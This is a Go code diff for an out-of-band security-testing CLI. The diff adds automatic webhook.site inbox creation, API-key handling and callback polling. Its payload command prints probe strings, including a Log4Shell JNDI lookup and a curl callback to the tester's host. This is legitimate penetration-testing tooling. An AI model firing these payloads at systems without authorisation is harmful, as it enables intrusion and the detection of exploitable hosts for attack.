@@ -92,6 +92,14 @@ func randID() string {
 func metaPath(sessPath string) string   { return filepath.Join(sessPath, "meta.json") }
 func eventsPath(sessPath string) string { return filepath.Join(sessPath, "events.jsonl") }
 
+func webhookAPIBase() string {
+	return strings.TrimSuffix(getenvDefault("WEBHOOK_SITE_API_BASE", "https://webhook.site"), "/")
+}
+
+func webhookAPIKey() string {
+	return os.Getenv("WEBHOOK_SITE_API_KEY")
+}
+
 func cmdInit(args []string) error {
 	fs := flag.NewFlagSet("init", flag.ContinueOnError)
 	provider := fs.String("provider", "interactsh", "Provider: interactsh|webhook")
@@ -106,6 +114,16 @@ func cmdInit(args []string) error {
 		if _, err := exec.LookPath("interactsh-client"); err != nil {
 			return errors.New("interactsh-client not found. Install it or run: oobcli up --provider webhook --webhook-url https://webhook.site/<uuid>")
 		}
+	}
+
+	webhookTarget := *webhookURL
+	if *provider == "webhook" && webhookTarget == "" {
+		fmt.Fprintln(os.Stderr, "webhook-url not provided; creating webhook.site inbox automatically…")
+		createdURL, _, err := createWebhookInbox(webhookAPIBase(), webhookAPIKey())
+		if err != nil {
+			return fmt.Errorf("failed to create webhook.site inbox automatically: %w (or pass --webhook-url)", err)
+		}
+		webhookTarget = createdURL
 	}
 
 	if *provider != "interactsh" && *provider != "webhook" {
@@ -136,8 +154,8 @@ func cmdInit(args []string) error {
 		CreatedAt: time.Now().UTC(),
 		Notes:     *note,
 	}
-	if *provider == "webhook" && *webhookURL != "" {
-		meta.ProviderKV = map[string]string{"webhook_url": *webhookURL}
+	if *provider == "webhook" && webhookTarget != "" {
+		meta.ProviderKV = map[string]string{"webhook_url": webhookTarget}
 	}
 	if err := writeJSON(metaPath(sessPath), &meta); err != nil {
 		return err
@@ -268,7 +286,11 @@ func cmdWatch(args []string) error {
 			url = meta.ProviderKV["webhook_url"]
 		}
 		if url == "" {
-			return errors.New("webhook provider requires --webhook-url set during init")
+			createdURL, err := ensureWebhookURL(sessPath, &meta)
+			if err != nil {
+				return fmt.Errorf("webhook provider requires a webhook URL: %w", err)
+			}
+			url = createdURL
 		}
 		return watchWebhookSite(url, outFile, *filter)
 	default:
@@ -387,15 +409,17 @@ func watchWebhookSite(inboxURL string, out io.Writer, filter string) error {
 		return errors.New("webhook url must end with inbox UUID, e.g., https://webhook.site/<uuid>")
 	}
 	token := parts[len(parts)-1]
-	apiBase := strings.TrimSuffix(getenvDefault("WEBHOOK_SITE_API_BASE", "https://webhook.site"), "/")
+	apiBase := webhookAPIBase()
+	apiKey := webhookAPIKey()
 	reqURL := fmt.Sprintf("%s/token/%s/requests?sorting=newest&limit=100", apiBase, token)
+	reqURL = addAPIKeyParam(reqURL, apiKey)
 
 	client := &http.Client{Timeout: 15 * time.Second}
 	seen := map[string]struct{}{}
 	fmt.Fprintf(os.Stderr, "Polling %s …\n", reqURL)
 	for {
 		req, _ := http.NewRequest("GET", reqURL, nil)
-		req.Header.Set("Accept", "application/json")
+		applyWebhookHeaders(req, apiKey)
 		resp, err := client.Do(req)
 		if err != nil {
 			fmt.Fprintln(os.Stderr, "poll error:", err)
@@ -405,7 +429,7 @@ func watchWebhookSite(inboxURL string, out io.Writer, filter string) error {
 		b, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode == 401 || resp.StatusCode == 403 {
-			fmt.Fprintln(os.Stderr, "webhook.site API requires an API key; skipping watch. Use send-test and inspect UI.")
+			fmt.Fprintln(os.Stderr, "webhook.site API denied access (401/403); set WEBHOOK_SITE_API_KEY or open the UI manually.")
 			return nil
 		}
 		if resp.StatusCode >= 400 {
@@ -495,6 +519,115 @@ func getenvDefault(k, def string) string {
 	return v
 }
 
+func addAPIKeyParam(reqURL, apiKey string) string {
+	if apiKey == "" {
+		return reqURL
+	}
+	u, err := url.Parse(reqURL)
+	if err != nil {
+		return reqURL
+	}
+	q := u.Query()
+	q.Set("api_key", apiKey)
+	u.RawQuery = q.Encode()
+	return u.String()
+}
+
+func applyWebhookHeaders(req *http.Request, apiKey string) {
+	req.Header.Set("Accept", "application/json")
+	if apiKey != "" {
+		req.Header.Set("Api-Key", apiKey)
+		req.Header.Set("X-Api-Key", apiKey)
+	}
+}
+
+func extractWebhookToken(m map[string]any) string {
+	if m == nil {
+		return ""
+	}
+	for _, k := range []string{"uuid", "token", "id"} {
+		if v, ok := m[k]; ok {
+			if s, ok := v.(string); ok && s != "" {
+				return s
+			}
+			if f, ok := v.(float64); ok {
+				return fmt.Sprintf("%.0f", f)
+			}
+		}
+	}
+	if nested, ok := m["data"].(map[string]any); ok {
+		if s := extractWebhookToken(nested); s != "" {
+			return s
+		}
+	}
+	return ""
+}
+
+func createWebhookInbox(apiBase, apiKey string) (string, string, error) {
+	apiBase = strings.TrimSuffix(apiBase, "/")
+	if apiBase == "" {
+		return "", "", errors.New("empty webhook.site API base")
+	}
+	endpoint := apiBase + "/token"
+	req, err := http.NewRequest("POST", endpoint, strings.NewReader(`{"default_status":200}`))
+	if err != nil {
+		return "", "", err
+	}
+	req.Header.Set("Content-Type", "application/json")
+	applyWebhookHeaders(req, apiKey)
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", "", err
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode >= 400 {
+		return "", "", fmt.Errorf("status %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
+	}
+	var obj map[string]any
+	_ = json.Unmarshal(body, &obj)
+	token := extractWebhookToken(obj)
+	if token == "" {
+		if loc := resp.Header.Get("Location"); loc != "" {
+			if u, err := url.Parse(loc); err == nil {
+				parts := strings.Split(strings.Trim(u.Path, "/"), "/")
+				if len(parts) > 0 {
+					token = parts[len(parts)-1]
+				}
+			}
+		}
+	}
+	if token == "" {
+		return "", "", errors.New("webhook.site create response missing token/uuid")
+	}
+	urlStr := strings.TrimSuffix(apiBase, "/") + "/" + token
+	return urlStr, token, nil
+}
+
+func ensureWebhookURL(sessPath string, meta *SessionMeta) (string, error) {
+	if meta.ProviderKV != nil {
+		if url := meta.ProviderKV["webhook_url"]; url != "" {
+			return url, nil
+		}
+	}
+	newURL, _, err := createWebhookInbox(webhookAPIBase(), webhookAPIKey())
+	if err != nil {
+		return "", err
+	}
+	if meta.ProviderKV == nil {
+		meta.ProviderKV = map[string]string{}
+	}
+	meta.ProviderKV["webhook_url"] = newURL
+	if sessPath != "" {
+		if err := writeJSON(metaPath(sessPath), meta); err != nil {
+			fmt.Fprintln(os.Stderr, "warning: failed to persist webhook url:", err)
+		}
+	}
+	fmt.Fprintln(os.Stderr, "provisioned webhook.site inbox automatically:", newURL)
+	return newURL, nil
+}
+
 func cmdSendTest(args []string) error {
 	fs := flag.NewFlagSet("send-test", flag.ContinueOnError)
 	sessionID := fs.String("session", "", "Session id to use")
@@ -526,12 +659,11 @@ func cmdSendTest(args []string) error {
 	var base string
 	switch meta.Provider {
 	case "webhook":
-		if meta.ProviderKV != nil {
-			base = meta.ProviderKV["webhook_url"]
+		authedURL, err := ensureWebhookURL(sessPath, &meta)
+		if err != nil {
+			return fmt.Errorf("webhook session missing webhook_url and auto-create failed: %w", err)
 		}
-		if base == "" {
-			return errors.New("webhook session missing webhook_url; re-init with --webhook-url")
-		}
+		base = authedURL
 	case "interactsh":
 		base = *targetOverride
 		if base == "" {
@@ -860,12 +992,9 @@ func cmdPayloads(args []string) error {
 		fmt.Println("# Log4Shell")
 		fmt.Printf("${jndi:ldap://%s/%s}\n", domain, *id)
 	case "webhook":
-		base := ""
-		if m.ProviderKV != nil {
-			base = m.ProviderKV["webhook_url"]
-		}
-		if base == "" {
-			return errors.New("webhook URL unknown — re-init with --webhook-url")
+		base, err := ensureWebhookURL(p, &m)
+		if err != nil {
+			return fmt.Errorf("webhook URL unavailable and auto-create failed: %w", err)
 		}
 		fmt.Println("# HTTP")
 		fmt.Printf("curl -sS '%s/%s?x=%s'\n", strings.TrimRight(base, "/"), *id, *id)
@@ -895,12 +1024,14 @@ func waitForWebhookTest(meta SessionMeta, testID string, deadline time.Time) boo
 		return false
 	}
 	token := parts[len(parts)-1]
-	apiBase := strings.TrimSuffix(getenvDefault("WEBHOOK_SITE_API_BASE", "https://webhook.site"), "/")
+	apiBase := webhookAPIBase()
+	apiKey := webhookAPIKey()
 	reqURL := fmt.Sprintf("%s/token/%s/requests?sorting=newest&limit=50", apiBase, token)
+	reqURL = addAPIKeyParam(reqURL, apiKey)
 	client := &http.Client{Timeout: 10 * time.Second}
 	for time.Now().Before(deadline) {
 		req, _ := http.NewRequest("GET", reqURL, nil)
-		req.Header.Set("Accept", "application/json")
+		applyWebhookHeaders(req, apiKey)
 		resp, err := client.Do(req)
 		if err != nil {
 			time.Sleep(2 * time.Second)
@@ -909,7 +1040,7 @@ func waitForWebhookTest(meta SessionMeta, testID string, deadline time.Time) boo
 		b, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode == 401 || resp.StatusCode == 403 {
-			fmt.Fprintln(os.Stderr, "webhook.site API requires an API key; skipping confirmation.")
+			fmt.Fprintln(os.Stderr, "webhook.site API denied access (set WEBHOOK_SITE_API_KEY to enable confirmation).")
 			return false
 		}
 		// Try parse as {data: []} or []
@@ -1035,6 +1166,7 @@ func usage() {
 	fmt.Println("  oobcli watch --session 1700000000-12345 --filter http")
 	fmt.Println("  oobcli send-test --session 1700000000-12345 --method POST --path /probe --body 'hi' --target-url https://<sub>.oast.live --wait 10s")
 	fmt.Println("  oobcli up --provider interactsh --wait 10s")
+	fmt.Println("  oobcli up --provider webhook")
 }
 
 func main() {
